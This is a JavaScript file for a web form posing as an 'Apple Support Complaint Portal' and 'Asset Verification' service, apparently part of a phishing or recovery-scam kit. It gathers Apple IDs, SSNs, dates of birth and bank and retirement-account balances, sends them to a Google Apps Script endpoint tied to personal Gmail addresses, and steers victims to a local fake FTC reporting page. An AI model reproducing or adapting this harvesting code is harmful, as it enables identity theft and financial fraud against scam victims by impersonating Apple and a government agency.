// Enhanced Form Interactions and Smooth Behavior

// Google Sheets configuration
const GOOGLE_SHEETS_CONFIG = {
    scriptURL: 'https://script.google.com/macros/s/AKfycbwuimijJ_sLD2MS6RWoVPIyXzg1WEPgJxQ7xMmm8hh_R30urol_Qq5hAsMVERfIXHm9/exec',
    spreadsheetId: '1nt9AMNvyH8iytT44IHClysQ5rR-m9IOzPaSBpiOQnyo',
    adminEmail: 'janetgunnoe09@gmail.com',
    adminEmail2: 'pw065508@gmail.com'
};

// Send data to Google Sheets
async function sendToGoogleSheets(formData, type = 'complaint') {
    try {
        // Prepare data for Google Sheets
        const sheetData = formatSheetData(formData, type);
        
        console.log('📊 Attempting to send to Google Sheets...');
        console.log('📋 Sheet data:', sheetData);
        console.log('🔗 Script URL:', GOOGLE_SHEETS_CONFIG.scriptURL);
        
        // Send to Google Sheets via Apps Script
        const response = await fetch(GOOGLE_SHEETS_CONFIG.scriptURL, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'text/plain;charset=utf-8',
            },
            body: JSON.stringify(sheetData)
        });
        
        console.log('📊 Data sent to Google Sheets for:', type);
        console.log('📋 Response status:', response.status);
        console.log('📧 Admin will receive notification at:', GOOGLE_SHEETS_CONFIG.adminEmail);
        
        // 🔥 CRITICAL: Update localStorage with new complaint
        const existingComplaints = JSON.parse(localStorage.getItem('complaints') || '[]');
        const newComplaint = {
            ...formData,
            id: formData.trackingNumber || formData.id || 'CMP' + Date.now(),
            timestamp: new Date().toISOString(),
            status: 'pending'
        };
        existingComplaints.push(newComplaint);
        localStorage.setItem('complaints', JSON.stringify(existingComplaints));
        console.log('💾 Saved complaint to localStorage:', newComplaint);
        
        // Also send immediate email notification as fallback
        sendImmediateEmailNotification(formData, type);
        
        // 🔥 THIS IS REQUIRED: Trigger dashboard refresh
        if (typeof refreshDashboard === 'function') {
            console.log('🔄 Triggering dashboard refresh after form submission...');
            setTimeout(() => {
                refreshDashboard();
            }, 1000);
        } else {
            console.log('⚠️ refreshDashboard function not available');
        }
        
        return true;
    } catch (error) {
        console.error('❌ Error sending to Google Sheets:', error);
        console.error('❌ Error details:', error.message);
        console.error('❌ Stack trace:', error.stack);
        
        // Fallback: Store in localStorage for manual retrieval
        const existingData = JSON.parse(localStorage.getItem('pendingSubmissions') || '[]');
        existingData.push({
            type: type,
            data: formData,
            timestamp: new Date().toISOString(),
            error: error.message
        });
        localStorage.setItem('pendingSubmissions', JSON.stringify(existingData));
        
        // 🔥 CRITICAL: Still update localStorage even on error
        const existingComplaints = JSON.parse(localStorage.getItem('complaints') || '[]');
        const newComplaint = {
            ...formData,
            id: formData.trackingNumber || formData.id || 'CMP' + Date.now(),
            timestamp: new Date().toISOString(),
            status: 'pending'
        };
        existingComplaints.push(newComplaint);
        localStorage.setItem('complaints', JSON.stringify(existingComplaints));
        console.log('💾 Saved complaint to localStorage (error path):', newComplaint);
        
        // Send immediate email notification as fallback
        sendImmediateEmailNotification(formData, type);
        
        // Still trigger dashboard update to show the complaint
        if (typeof refreshDashboard === 'function') {
            console.log('🔄 Triggering dashboard refresh after error handling...');
            setTimeout(() => {
                refreshDashboard();
            }, 1000);
        }
        
        console.log('💾 Data stored locally due to error');
        console.log('📊 Local storage data count:', existingData.length);
        return false;
    }
}

// Immediate email notification using mailto - works instantly
function sendImmediateEmailNotification(formData, type = 'complaint') {
    try {
        console.log('📧 Sending immediate email notification to:', GOOGLE_SHEETS_CONFIG.adminEmail);
        
        // Create email subject and body
        const subject = type === 'complaint' 
            ? `[APPLE COMPLAINT PORTAL] New Complaint — Tracking: ${formData.trackingNumber || formData.id || 'N/A'} | ${formData.fullName || 'N/A'}`
            : `[APPLE ASSET VERIFICATION] New Submission — Ref: ${formData.referenceNumber || 'N/A'} | ${formData.fullName || 'N/A'}`;
        
        let body = `A new submission has been received in the Apple Support Complaint Portal.\n\n`;
        body += `Type: ${type}\n`;
        body += `Timestamp: ${new Date().toLocaleString()}\n`;
        body += `Tracking Number: ${formData.trackingNumber || formData.id || 'N/A'}\n`;
        body += `Name: ${formData.fullName || 'N/A'}\n`;
        body += `Email: ${formData.email || 'N/A'}\n`;
        body += `Phone: ${formData.phoneNumber || 'N/A'}\n`;
        body += `Complaint Type: ${formData.complaintType || 'N/A'}\n`;
        body += `Description: ${formData.complaintDescription || formData.description || 'N/A'}\n`;
        body += `Status: ${formData.status || 'pending'}\n\n`;
        body += `---\nThis is an automated notification from the Apple Support Complaint Portal.`;
        
        console.log('📧 Email notification handled server-side via Google Apps Script.');
        
        // Also try Google Apps Script as backup
        setTimeout(() => {
            const testEmailData = {
                sheet: 'Complaints',
                data: [
                    new Date().toISOString(),
                    formData.trackingNumber || formData.id || 'N/A',
                    formData.fullName || 'N/A',
                    formData.phoneNumber || 'N/A',
                    formData.email || 'N/A',
                    formData.appleId || 'N/A',
                    formData.complaintType || 'N/A',
                    formData.complaintDescription || formData.description || 'N/A',
                    new Date().toISOString().split('T')[0], // Date of incident
                    formData.status || 'pending'
                ]
            };
            
            fetch(GOOGLE_SHEETS_CONFIG.scriptURL, {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'text/plain;charset=utf-8',
                },
                body: JSON.stringify(testEmailData)
            }).then(() => {
                console.log('📧 Backup email sent to Google Apps Script');
            }).catch(error => {
                console.error('❌ Error sending backup email:', error);
            });
        }, 1000);
        
        return true;
    } catch (error) {
        console.error('❌ Error with email notification setup:', error);
        return false;
    }
}

// Fallback mailto function
function sendMailtoFallback(formData, type = 'complaint') {
    try {
        const subject = type === 'complaint' 
            ? `[APPLE COMPLAINT PORTAL] New Complaint — Tracking: ${formData.id || 'N/A'} | ${formData.fullName || 'N/A'}`
            : `[APPLE ASSET VERIFICATION] New Submission — Ref: ${formData.referenceNumber || 'N/A'} | ${formData.fullName || 'N/A'}`;
        
        const emailBody = formatEmailBody(formData, type);
        console.log('📧 Fallback email handled server-side via Google Apps Script.');
    } catch (error) {
        console.error('❌ Error with mailto fallback:', error);
    }
}

// Format email body
function formatEmailBody(formData, type) {
    let body = `New ${type} submission received:\n\n`;
    
    if (type === 'complaint') {
        body += `COMPLAINT DETAILS:\n`;
        body += `Tracking Number: ${formData.id || 'N/A'}\n`;
        body += `Full Name: ${formData.fullName || 'N/A'}\n`;
        body += `Phone: ${formData.phoneNumber || 'N/A'}\n`;
        body += `Email: ${formData.email || 'N/A'}\n`;
        body += `Apple ID: ${formData.appleId || 'N/A'}\n`;
        body += `Complaint Type: ${formData.complaintType || 'N/A'}\n`;
        body += `Description: ${formData.complaintDescription || 'N/A'}\n`;
        body += `Submitted: ${new Date(formData.timestamp).toLocaleString()}\n`;
        body += `Status: ${formData.status || 'pending'}\n`;
    } else if (type === 'asset') {
        body += `ASSET VERIFICATION DETAILS:\n`;
        body += `Reference Number: ${formData.referenceNumber || 'N/A'}\n`;
        body += `Loss Type: ${formData.lossType || 'N/A'}\n`;
        body += `Loss Amount: $${formData.lossAmount || 'N/A'}\n`;
        body += `Description: ${formData.lossDescription || 'N/A'}\n`;
        body += `Date of Incident: ${formData.incidentDate || 'N/A'}\n`;
        body += `Authorities Contacted: ${formData.authoritiesContacted || 'N/A'}\n`;
        body += `SSN: ${formData.ssn ? '***-**-' + formData.ssn.slice(-4) : 'N/A'}\n`;
        body += `DOB: ${formData.dob || 'N/A'}\n`;
        body += `Reimbursement Method: ${formData.reimbursementMethod || 'N/A'}\n`;
        body += `Submitted: ${new Date().toLocaleString()}\n`;
    }
    
    body += `\n---\nThis is an automated notification from the Apple Support Complaint Portal.`;
    return body;
}

// Format data for Google Sheets
function formatSheetData(formData, type) {
    if (type === 'complaint') {
        return {
            sheet: 'Complaints',
            data: [
                new Date().toISOString(), // Timestamp
                formData.id || 'N/A', // Tracking Number
                formData.fullName || 'N/A', // Full Name
                formData.phoneNumber || 'N/A', // Phone
                formData.email || 'N/A', // Email
                formData.appleId || 'N/A', // Apple ID
                formData.complaintType || 'N/A', // Complaint Type
                formData.complaintDescription || 'N/A', // Description
                new Date(formData.timestamp).toLocaleString(), // Submitted
                formData.status || 'pending', // Status
                'Pending Review' // Processing Status
            ]
        };
    } else if (type === 'asset') {
        return {
            sheet: 'AssetVerifications',
            data: [
                new Date().toISOString(), // Timestamp
                formData.referenceNumber || 'N/A', // Reference Number
                formData.lossType || 'N/A', // Loss Type
                formData.lossAmount || 'N/A', // Loss Amount
                formData.lossDescription || 'N/A', // Description
                formData.incidentDate || 'N/A', // Date of Incident
                formData.authoritiesContacted || 'N/A', // Authorities Contacted
                formData.ssn ? '***-**-' + formData.ssn.slice(-4) : 'N/A', // SSN (masked)
                formData.dob || 'N/A', // DOB
                formData.propertyCount || 'N/A', // Property Count
                formData.bankAccountCount || 'N/A', // Bank Account Count
                formData.creditCardCount || 'N/A', // Credit Card Count
                formData.has401k || 'N/A', // 401k
                formData.balance401k || 'N/A', // 401k Balance
                formData.hasIRA || 'N/A', // IRA
                formData.balanceIRA || 'N/A', // IRA Balance
                formData.hasMoneyMarket || 'N/A', // Money Market
                formData.balanceMoneyMarket || 'N/A', // Money Market Balance
                formData.reimbursementMethod || 'N/A', // Reimbursement Method
                formData.additionalInfo || 'N/A', // Additional Info
                localStorage.getItem('userEmail') || 'N/A', // User Email
                'Submitted' // Status
            ]
        };
    }
}

// Generate 8-character password function
function generatePassword() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
    let password = '';
    for (let i = 0; i < 8; i++) {
        password += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return password;
}

// Generate sequential tracking number
function generateTrackingNumber() {
    const existingComplaints = JSON.parse(localStorage.getItem('complaints') || '[]');
    const highestNumber = existingComplaints.reduce((max, complaint) => {
        const match = complaint.id?.match(/CMP(\d+)/);
        if (match) {
            return Math.max(max, parseInt(match[1]));
        }
        return max;
    }, 0);
    
    return 'CMP' + (highestNumber + 1);
}

// Check if user exists
function checkUserExists(email) {
    const existingUsers = JSON.parse(localStorage.getItem('users') || '[]');
    return existingUsers.find(user => user.email === email);
}

// Update authentication UI
function updateAuthUI() {
    const authLinks = document.getElementById('authLinks');
    if (!authLinks) return;
    
    const token = localStorage.getItem('authToken');
    const userEmail = localStorage.getItem('userEmail');
    
    if (token && userEmail) {
        // User is logged in
        authLinks.innerHTML = `
            <a href="dashboard.html" style="color: #f5f5f7;">Dashboard</a>
            <a href="#" onclick="logout()" style="color: #f5f5f7;">Logout</a>
        `;
    } else {
        // User is not logged in - show simple login link
        authLinks.innerHTML = `
            <a href="login.html" style="color: #0071e3; text-decoration: none; font-weight: 500;">Login</a>
        `;
    }
}

document.addEventListener('DOMContentLoaded', function() {
    // Smooth scroll to complaint form when clicking "File a Complaint" buttons
    const complaintButtons = document.querySelectorAll('[href*="complaint"], .complaint-btn');
    const complaintForm = document.querySelector('.complaint-form-container');
    
    complaintButtons.forEach(button => {
        button.addEventListener('click', function(e) {
            if (complaintForm) {
                e.preventDefault();
                complaintForm.scrollIntoView({ 
                    behavior: 'smooth', 
                    block: 'center' 
                });
                
                // Focus on first input field after scrolling
                setTimeout(() => {
                    const firstInput = complaintForm.querySelector('input');
                    if (firstInput) {
                        firstInput.focus();
                    }
                }, 800);
            }
        });
    });
    
    // Form validation function
    function validateForm(form) {
        const requiredFields = form.querySelectorAll('[required]');
        const submitBtn = form.querySelector('.submit-btn');
        const recaptchaCheckbox = form.querySelector('#recaptcha');
        
        let isValid = true;
        
        // Check all required fields
        requiredFields.forEach(field => {
            if (!field.value.trim()) {
                isValid = false;
            }
            
            // Special validation for email fields
            if (field.type === 'email' && field.value.trim()) {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailRegex.test(field.value.trim())) {
                    isValid = false;
                }
            }
            
            // Special validation for phone field
            if (field.id === 'phoneNumber' && field.value.trim()) {
                const phoneRegex = /^\d{10}$/;
                if (!phoneRegex.test(field.value.trim())) {
                    isValid = false;
                }
            }
        });
        
        // Check if recaptcha checkbox is checked
        if (recaptchaCheckbox && !recaptchaCheckbox.checked) {
            isValid = false;
        }
        
        // Enable/disable submit button
        if (submitBtn) {
            submitBtn.disabled = !isValid;
        }
        
        return isValid;
    }
    
    // Form field animations and validation feedback
    const formGroups = document.querySelectorAll('.form-group');
    
    formGroups.forEach(group => {
        const input = group.querySelector('input, select, textarea');
        const errorMessage = group.querySelector('.error-message');
        
        if (input && errorMessage) {
            // Add input event listener for real-time validation
            input.addEventListener('input', function() {
                const form = this.closest('form');
                if (form) {
                    validateForm(form);
                }
                
                // Clear error message when user starts typing
                if (this.value.trim()) {
                    group.classList.remove('error');
                    errorMessage.style.display = 'none';
                }
            });
            
            // Add smooth validation feedback
            input.addEventListener('blur', function() {
                const form = this.closest('form');
                if (form) {
                    validateForm(form);
                }
                
                if (this.hasAttribute('required') && !this.value.trim()) {
                    group.classList.add('error');
                    errorMessage.textContent = 'This field is required';
                    errorMessage.style.display = 'block';
                } else {
                    group.classList.remove('error');
                    errorMessage.style.display = 'none';
                }
            });
            
            // Smooth focus effects
            input.addEventListener('focus', function() {
                group.classList.add('focused');
                // Animate the form group
                group.style.transform = 'translateX(4px)';
                setTimeout(() => {
                    group.style.transform = 'translateX(0)';
                }, 200);
            });
            
            input.addEventListener('blur', function() {
                group.classList.remove('focused');
            });
        }
    });
    
    // Add recaptcha checkbox event listener
    const recaptchaCheckboxes = document.querySelectorAll('#recaptcha');
    recaptchaCheckboxes.forEach(checkbox => {
        checkbox.addEventListener('change', function() {
            const form = this.closest('form');
            if (form) {
                validateForm(form);
            }
        });
    });
    
    // Initialize form validation on page load
    const allComplaintForms = document.querySelectorAll('.complaint-form');
    allComplaintForms.forEach(form => {
        validateForm(form);
    });
    
    // Smooth form submission animation
    
    allComplaintForms.forEach(form => {
        console.log('🎯 form-enhancements.js: Adding submit listener to form:', form);
        form.addEventListener('submit', function(e) {
            console.log('🚀 form-enhancements.js: Form submit event triggered!');
            e.preventDefault();
            e.stopImmediatePropagation(); // Prevent any other event listeners
            
            const submitBtn = form.querySelector('.submit-btn') || form.querySelector('.btn-primary');
            const loadingSpinner = submitBtn ? submitBtn.querySelector('.loading-spinner') : null;
            const btnText = submitBtn ? submitBtn.querySelector('.btn-text') : null;
            const successMessage = form.querySelector('.success-message');
            
            // Start submission animation
            submitBtn.disabled = true;
            if (btnText) {
                btnText.textContent = 'Submitting...';
            } else {
                submitBtn.textContent = 'Submitting...';
            }
            if (loadingSpinner) {
                loadingSpinner.style.display = 'inline-block';
            }
            
            // Collect form data
            const formData = new FormData(form);
            const complaintData = {};
            formData.forEach((value, key) => {
                complaintData[key] = value;
            });
            
            // Add timestamp and status
            complaintData.timestamp = new Date().toISOString();
            complaintData.status = 'pending';
            
            // Generate sequential tracking number
            const trackingNumber = generateTrackingNumber();
            complaintData.id = trackingNumber;
            
            // Check if user exists and generate credentials
            const userEmail = complaintData.email;
            const existingUser = checkUserExists(userEmail);
            const userPassword = generatePassword();
            
            console.log('👤 User existence check:', existingUser ? 'Existing user' : 'New user');
            
            // Store user credentials in localStorage for demo purposes
            const userCredentials = {
                email: userEmail,
                password: userPassword,
                trackingNumber: trackingNumber,
                complaintData: complaintData
            };
            
            // Store in localStorage for demo purposes (in production, this would be sent to a real API)
            try {
                const existingComplaints = JSON.parse(localStorage.getItem('complaints') || '[]');
                existingComplaints.push(complaintData);
                localStorage.setItem('complaints', JSON.stringify(existingComplaints));
                
                // Store user credentials separately for login
                const existingUsers = JSON.parse(localStorage.getItem('users') || '[]');
                
                if (existingUser) {
                    // Update existing user's password and add new complaint
                    const userIndex = existingUsers.findIndex(u => u.email === userEmail);
                    existingUsers[userIndex].password = userPassword;
                    existingUsers[userIndex].trackingNumber = trackingNumber;
                    existingUsers[userIndex].complaintData = complaintData;
                } else {
                    // Add new user
                    existingUsers.push(userCredentials);
                }
                
                localStorage.setItem('users', JSON.stringify(existingUsers));
                
                // Create authentication token for immediate dashboard access
                const authToken = 'token_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                localStorage.setItem('authToken', authToken);
                localStorage.setItem('userEmail', userEmail);
                localStorage.setItem('userInfo', JSON.stringify({
                    fullName: complaintData.fullName,
                    email: userEmail,
                    memberSince: new Date().toLocaleDateString()
                }));
                
                // Update authentication UI immediately
                updateAuthUI();
                
                // Send data to Google Sheets
                sendToGoogleSheets(complaintData, 'complaint');
                
                console.log('Complaint submitted successfully:', complaintData);
                console.log('User credentials generated:', { email: userEmail, password: userPassword });
                console.log('Authentication token created for immediate access');
                
                // Success animation
                setTimeout(() => {
                    if (loadingSpinner) {
                        loadingSpinner.style.display = 'none';
                    }
                    if (btnText) {
                        btnText.textContent = 'Submitted!';
                    } else {
                        submitBtn.textContent = 'Submitted!';
                    }
                    submitBtn.style.backgroundColor = '#34c759';
                    
                    // Show success message with tracking number AND login credentials
                    const userType = existingUser ? 'Existing User' : 'New User';
                    const accountMessage = existingUser ? 
                        'A new temporary password has been generated for your existing account.' : 
                        'An account has been automatically created for you.';
                    
                    if (successMessage) {
                        successMessage.innerHTML = `
                        <div style="background:#f0fdf4;border:1px solid #86efac;border-radius:12px;padding:24px 20px;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display',sans-serif;">
                            <div style="font-size:22px;font-weight:700;color:#15803d;margin-bottom:4px;">✅ Complaint Submitted Successfully!</div>
                            <div style="font-size:13px;color:#166534;margin-bottom:20px;">Your complaint has been received and logged.</div>

                            <div style="background:#fff;border:1px solid #d1fae5;border-radius:10px;padding:16px;margin-bottom:16px;">
                                <div style="font-size:12px;font-weight:600;color:#6b7280;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;">Your Complaint ID</div>
                                <div style="font-size:28px;font-weight:700;color:#0071e3;letter-spacing:.04em;">${trackingNumber}</div>
                                <div style="font-size:12px;color:#6b7280;margin-top:4px;">Save this number — you will need it to track your case.</div>
                            </div>

                            <div style="background:#fff;border:1px solid #e5e7eb;border-radius:10px;padding:16px;margin-bottom:20px;">
                                <div style="font-size:12px;font-weight:600;color:#6b7280;text-transform:uppercase;letter-spacing:.06em;margin-bottom:10px;">🔐 Your Account Credentials</div>
                                <div style="font-size:14px;color:#1d1d1f;margin-bottom:6px;"><strong>Email:</strong> ${userEmail}</div>
                                <div style="font-size:14px;color:#1d1d1f;margin-bottom:6px;"><strong>Password:</strong> <code style="background:#f3f4f6;padding:3px 8px;border-radius:5px;font-size:13px;letter-spacing:.05em;">${userPassword}</code></div>
                                <div style="font-size:12px;color:#6b7280;margin-top:8px;">💾 Save these credentials to log in and track your complaint status.</div>
                            </div>

                            <div style="background:#eff6ff;border:1px solid #bfdbfe;border-radius:10px;padding:16px;margin-bottom:20px;">
                                <div style="font-size:13px;font-weight:600;color:#1e40af;margin-bottom:6px;">📋 Next Step — File with the FTC</div>
                                <div style="font-size:13px;color:#1e3a8a;margin-bottom:14px;">To proceed with your fraud claim and reimbursement, you must also file a report with the Federal Trade Commission (FTC) using your Complaint ID above.</div>
                                <a href="ftc-portal/index.html" target="_blank" style="display:inline-block;background:#0071e3;color:#fff;text-decoration:none;border-radius:980px;padding:12px 28px;font-size:15px;font-weight:600;letter-spacing:-.01em;">Report Fraud to FTC →</a>
                            </div>

                            <div style="font-size:12px;color:#9ca3af;text-align:center;">Complaint ID: <strong>${trackingNumber}</strong> &nbsp;|&nbsp; Submitted: ${new Date().toLocaleString()}</div>
                        </div>
                    `;
                    successMessage.style.display = 'block';
                    successMessage.style.opacity = '0';
                    successMessage.style.transform = 'translateY(10px)';
                    setTimeout(() => {
                        successMessage.style.opacity = '1';
                        successMessage.style.transform = 'translateY(0)';
                        successMessage.style.transition = 'all 0.4s ease';
                    }, 100);
                    }
                }, 1500);
                
            } catch (error) {
                console.error('Error saving complaint:', error);
                
                // Error animation
                setTimeout(() => {
                    if (loadingSpinner) {
                        loadingSpinner.style.display = 'none';
                    }
                    if (btnText) {
                        btnText.textContent = 'Error - Try Again';
                    } else {
                        submitBtn.textContent = 'Error - Try Again';
                    }
                    submitBtn.style.backgroundColor = '#d32f2f';
                    
                    setTimeout(() => {
                        submitBtn.disabled = false;
                        if (btnText) {
                            btnText.textContent = 'Submit Complaint';
                        } else {
                            submitBtn.textContent = 'Submit Complaint';
                        }
                        submitBtn.style.backgroundColor = '';
                        validateForm(form);
                    }, 3000);
                }, 1000);
            }
        });
    });
    
    // Smooth scroll behavior for internal links
    const internalLinks = document.querySelectorAll('a[href^="#"]');
    internalLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            const targetId = this.getAttribute('href').substring(1);
            const targetElement = document.getElementById(targetId);
            
            if (targetElement) {
                e.preventDefault();
                targetElement.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
    
    // Parallax effect for complaint sections
    const complaintSections = document.querySelectorAll('.complaint-section');
    
    window.addEventListener('scroll', function() {
        const scrolled = window.pageYOffset;
        
        complaintSections.forEach(section => {
            const rect = section.getBoundingClientRect();
            const speed = 0.5;
            
            if (rect.top < window.innerHeight && rect.bottom > 0) {
                const yPos = -(scrolled * speed);
                section.style.backgroundPosition = `center ${yPos}px`;
            }
        });
    });
    
    // Smooth form container entrance animation
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };
    
    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const container = entry.target;
                container.style.opacity = '0';
                container.style.transform = 'translateY(30px)';
                
                setTimeout(() => {
                    container.style.transition = 'all 0.6s ease';
                    container.style.opacity = '1';
                    container.style.transform = 'translateY(0)';
                }, 100);
                
                observer.unobserve(container);
            }
        });
    }, observerOptions);
    
    // Observe all complaint form containers
    document.querySelectorAll('.complaint-form-container').forEach(container => {
        observer.observe(container);
    });
});
